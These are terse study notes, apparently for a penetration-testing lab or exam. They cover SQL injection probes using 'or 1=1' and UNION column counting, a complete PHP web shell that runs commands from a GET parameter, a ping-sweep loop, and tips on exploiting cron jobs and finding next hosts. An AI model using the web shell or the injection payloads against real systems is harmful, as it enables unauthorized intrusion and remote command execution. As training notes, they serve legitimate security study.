- In a login page, you can ONLY get credentials
  - can not do the UNION stuff

- to find vulnerable spot in sql database 
  - php?VARIABLE=1 or 1=1;#
    - find the vulnerable one 
    - lets say its 2
  - VARIABLE=2 UNION select 1,2,3;# (adding numbers to find the correct amount of columns)

IF YOU SEE A ZIP FILE ON A WEB SERVER, DOWNLOAD IT, IT'S PROBABLY USEFUL INFO 
  - `unzip filename.zip`
  
if a place where you can upload files, prolly wanna do a webshell instead off sshkeys in the cmd injection method
  - upload the webshell script (.php)
  ```
    <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
  ```

`for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from"); done`
  - THIS IS HOW YOU COULDNT FIND THE LAST BOX OF PART 1


IF LINUX QUESTION ABOUT PERSISTENCE, IT WILL BE IN CRONSHIT. or a question about something happening every 5 minutes or something 
- smart to check /etc/cron.d or /etc/crontab before you go through the hourly, monthly, daily ones        
  - look for custom names or something with "script" in the name
  - look for user, if root is using them, they could be exploitable, especially if it's not a standard cronjob
    - potential phony ls script


USE WINDOWS OP STATION FOR ANY REVERSE ENGINEERING
- "re_this" - it's gonna be obvious if you're supposed to reverse engineer something 

WHEN YOU GET BACKEND ACCESS, CHECK /ETC/HOSTS FOR THE NEXT BOX, OR PING SWEEP SYNTAX













